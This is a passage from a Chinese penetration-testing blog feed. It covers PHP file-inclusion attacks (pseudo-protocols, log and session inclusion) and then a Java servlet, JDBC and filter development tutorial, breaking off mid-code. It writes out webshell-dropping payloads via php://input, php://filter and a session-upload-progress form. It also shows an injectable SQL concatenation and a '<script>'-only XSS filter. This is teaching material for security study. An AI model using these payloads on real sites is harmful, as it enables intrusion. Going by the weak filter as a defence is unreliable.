class="line"><span class="variable">$base64data</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmpFilePath</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:image/jpeg;base64,&#x27;</span>.<span class="variable">$base64data</span>.<span class="string">&#x27;&quot; alt=&quot;上传图片&quot;&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>内容通过前面的协议进行解析，不再关注后缀</p><p>分站存储：文件上传到另一台存储服务器</p><p>OSS对象：通过阿里云等云服务的OSS存储服务来存储，Access控制–OSS对象存储–Bucket对象</p><p>目前随着架构的改变，文件上传漏洞越来越少</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无须再次编写，这种调用文件的过程一般被称为文件包含。在文件包含中，被包含的文件内容会被当做当前脚本语言去执行代码，比如一个1.txt中写了phpinfo()，然后通过一个index.php文件去包含1.txt，那么phpinfo()代码会被以php方式执行</p><p>相关函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP：include、require、include_once、require_once 等</span><br><span class="line">include 在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行</span><br><span class="line">require 函数出现错误的时候，会直接报错并退出程序的执行</span><br><span class="line">Java：java.io.File、java.io.FileReader 等</span><br><span class="line">ASP.NET：System.IO.FileStream、System.IO.StreamReader 等</span><br></pre></td></tr></table></figure><p>所以如果使用了文件包含的函数且包含的文件可控，就可能存在漏洞</p><p>分类：本地包含-Local File Include-LFI，远程包含-Remote File Include-RFI，差异原因是由代码过滤和环境配置文件开关决定，不过现在一般都是本地包含，远程包含默认是关闭的</p><p>利用：可以上传文件的话，通过上传文件，内容写恶意代码；但大多数是我们无法上传文件，这时需要通过：包含日志文件利用、包含session文件利用、伪协议利用</p><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p>关于PHP的伪协议，参考： <a href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a></p><p><img src="/2024/02/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--WEB%E6%94%BB%E9%98%B2(%E4%B8%8A)/image-20240220003834354.png" alt="image-20240220003834354"></p><p>文件读取： file直接读取文件，需要绝对路径；而php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;可以使用相对路径</p><p>文件写入： php:&#x2F;&#x2F;input可以写入文件也可以直接执行代码，POST传入内容，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  访问http://127.0.0.1/include.php?file=php://input</span></span><br><span class="line"><span class="comment">//  然后POST传入以下内容</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>php:&#x2F;&#x2F;filter&#x2F;write也可以写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.base64-decode/resource=123.php</span><br><span class="line">然后post传入以下内容</span><br><span class="line">content=base64编码值</span><br></pre></td></tr></table></figure><p>访问123.php即可</p><p>当然除了这种base64编码外，还可以通过凯撒13的方式，因为php内置了这种方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=string.rot13/resource=2.php</span><br><span class="line">content=&lt;?cuc riny($_CBFG[1]);?&gt;</span><br></pre></td></tr></table></figure><p>代码执行： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php://input</span><br><span class="line">data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">data://text/plain;base64,xxxxxxxxxx</span><br><span class="line">php执行系统命令：&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h3><p>通过 file:&#x2F;&#x2F; 直接读取日志文件，一般日志文件会记录一些请求头如UA，这样我们抓包，将UA改为要执行的代码，然后直接包含这个日志文件即可，像Linux采用nginx搭建的php站点，日志文件路径为：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><h3 id="SESSION包含"><a href="#SESSION包含" class="headerlink" title="SESSION包含"></a>SESSION包含</h3><p>需要先去控制一个session的名字，可以通过表单提交，但是session内容默认会被清空，这时需要条件竞争，和文件上传类似，需要在内容清空之前访问这个session使其执行里面的代码，生成恶意文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://xxxxxxxx/&quot;</span> <span class="attr">nethod</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;)?&gt;&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>随便上传一个文件，提交时抓包，然后在请求头Cookie处修改： Cookie: PHPSESSID&#x3D;qax，然后通过file伪协议访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxxxx/?file=/tmp/sess_qax</span><br></pre></td></tr></table></figure><p>发现这个session存在，然后通过条件竞争，先不断的访问这个session，然后再不断的去提交，最终访问shell.php即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;&lt;strong&gt;此篇主要写一些常规漏洞方面的知识，从不同的语言特性去讲解&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;ASP&quot;&gt;&lt;a href=&quot;#ASP&quot; class=&quot;headerlink&quot; title=&quot;ASP&quot;&gt;&lt;/a&gt;ASP&lt;/h1&gt;&lt;p&gt;大部分A</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://ink-scholar.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="攻防" scheme="https://ink-scholar.github.io/tags/%E6%94%BB%E9%98%B2/"/>
    
    <category term="WEB" scheme="https://ink-scholar.github.io/tags/WEB/"/>
    
    <category term="漏洞" scheme="https://ink-scholar.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--安全开发(下)</title>
    <link href="https://ink-scholar.github.io/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/"/>
    <id>https://ink-scholar.github.io/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/</id>
    <published>2024-02-07T05:21:02.979Z</published>
    <updated>2024-02-17T06:23:16.104Z</updated>
    
    <content type="html"><![CDATA[<p><em><strong>此篇主要写一些Java方面的开发知识，让大家对java有一个全面的了解</strong></em></p><h1 id="Java-Servlet"><a href="#Java-Servlet" class="headerlink" title="Java Servlet"></a>Java Servlet</h1><p>Servlet 是运行在Web服务器或应用服务器上的程序,它是作为来自Web浏览器或其他HTTP客户端的请求和 HTTP服务器上的数据库或应用程序之间的中间层。使用 Servlet可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。</p><h2 id="使用创建"><a href="#使用创建" class="headerlink" title="使用创建"></a>使用创建</h2><p>使用IDEA开发，新建项目选择Jakarta EE，提前下载好tomcat的压缩包，去官网下载即可</p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240207142731360.png" alt="image-20240207142731360"></p><p>此处选择Java EE 8，不然在进行路由访问时会爆一些错误，原因现在先不深究</p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240207155009259.png" alt="image-20240207155009259"></p><p>我们在src–main–java下的那个demo目录下，与HelloServlet同级建立一个IndexServlet</p><p>创建一个类继承HttpServlet，写入内置方法，这里我们用doGet</p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240207163228570.png" alt="image-20240207163228570"></p><p>在web.xml中添加访问路由</p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240207144559918.png" alt="image-20240207144559918"></p><p>之后我们通过tomcat构建之后，访问&#x2F;index?name&#x3D;123，可以在日志那里看到我们的输出内容hhhhhhh，在页面可以看到我们传入的name值</p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240207163429380.png" alt="image-20240207163429380"></p><p>以上是一个标准的写法，当然这种添加路由的方式有点麻烦，也可以直接在public上面加上 <strong>@WebServlet(“&#x2F;index”)</strong></p><p>如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/index&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;name: &quot;</span>+name);</span><br><span class="line">        System.out.println(<span class="string">&quot;hhhhhhhhh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><p>盗张图看一下</p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240207165241733.png" alt="image-20240207165241733"></p><p>简单来说，init和destroy只执行一次，init在启动服务时执行，destroy在服务关闭时执行，service可以执行很多次，service包括Servlet service和http service，先执行servlet再去执行http，因为servlet负责接收请求方式而http负责接收传入的数据</p><h1 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h1><p>在java中常用三种方式：<strong>JDBC</strong>、<strong>Hibernate</strong>和<strong>Mybatis</strong>，目前最常用的时<strong>Mybatis</strong>，会在下面SpringBoot部分详细说明</p><h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><p>java提供，自带的api接口，但是在使用时需要先下载一个驱动，在 <a href="https://mvnrepository.com/">https://mvnrepository.com</a> 进行下载</p><p>搜索mysql，选择 MySQL Connector Java，下载即可，在代码的根目录下面新建lib目前，将jar文件拖入，然后右键，选择添加为库，简单的demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MysqlServlet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>); <span class="comment">//注册数据库驱动</span></span><br><span class="line">        <span class="comment">//建立数据库连接</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/db&quot;</span>;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">        <span class="comment">//创建执行sql语句</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from admin&quot;</span>;</span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line">        System.out.println(rs);</span><br><span class="line">        <span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> rs.getInt(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">un</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">pw</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            System.out.println(id+<span class="string">&quot;  &quot;</span>+un+<span class="string">&quot;  &quot;</span>+pw+<span class="string">&quot;  &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h2><p>预编译简单理解就是使用了预编译之后，你输入的内容无法改变代码原有的执行逻辑，具体原理可以自行查询</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MysqlServlet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;please input id : &quot;</span>);</span><br><span class="line">        String s=scanner.nextLine();</span><br><span class="line"></span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/db&quot;</span>;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">        <span class="comment">//不安全的写法</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from admin where id = &quot;</span>+s;</span><br><span class="line">        System.out.println(sql);</span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line">        <span class="comment">//预编译写法</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">safesql</span> <span class="operator">=</span> <span class="string">&quot;select * from admin where id = ?&quot;</span>;</span><br><span class="line">        PreparedStatement preparedStatement=connection.prepareStatement(safesql);</span><br><span class="line">        preparedStatement.setString(<span class="number">1</span>,s);</span><br><span class="line">        ResultSet resultSet=preparedStatement.executeQuery(safesql);</span><br><span class="line">        System.out.println(preparedStatement);</span><br><span class="line">        <span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> rs.getInt(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">un</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">pw</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            System.out.println(id+<span class="string">&quot;  &quot;</span>+un+<span class="string">&quot;  &quot;</span>+pw+<span class="string">&quot;  &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="过滤器Filter"><a href="#过滤器Filter" class="headerlink" title="过滤器Filter"></a>过滤器Filter</h1><p>实际上就是对Web资源进行拦截，做一些处理后再交给下一个过滤器或Servlet处理，通常都是用来拦截request进行处理的，也可以对返回的response进行拦截处理。使用filter技术可以实现对所有Web资源的管理，例如权限访问等，我们所说的Filter Shell，也就是内存马之一，就是在这一层实现的</p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240207191452888.png" alt="image-20240207191452888"></p><h2 id="XSS过滤"><a href="#XSS过滤" class="headerlink" title="XSS过滤"></a>XSS过滤</h2><p>先写一个IndexServlet的正常文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/index&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;code&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        out.println(code);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在和上述文件的同级目录在写一个过滤文件，命名为XssFilter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(&quot;/index&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XssFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;开启XSS过滤&quot;</span>); <span class="comment">//中间件启动就开始执行，init初始化</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;销毁XSS过滤&quot;</span>); <span class="comment">//中间件服务关闭执行，消亡</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// 访问路由index时触发</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在进行XSS过滤&quot;</span>);</span><br><span class="line">        <span class="comment">// 过滤代码，对数据进行过滤</span></span><br><span class="line">        HttpServletRequest request=(HttpServletRequest) servletRequest;</span><br><span class="line">        String code=request.getParameter(<span class="string">&quot;code&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!code.contains(<span class="string">&quot;&lt;script&gt;&quot;</span>))&#123;</span><br><span class="line">            <span class="comment">// 放行</span></span><br><span class="line">            filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;存在XSS！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="未授权检测"><a href="#未授权检测" class="headerlink" title="未授权检测"></a>未授权检测</h2><p>这里简单写一下cookie的检测</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(&quot;/index&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XssFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;开启Cookie过滤&quot;</span>); <span class="comment">//中间件启动就开始执行，init初始化</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;销毁Cookie过滤&quot;</span>); <span class="comment">//中间件服务关闭执行，消亡</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// 访问路由index时触发</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="comment">// 取出cookie值</span></span><br><span class="line">        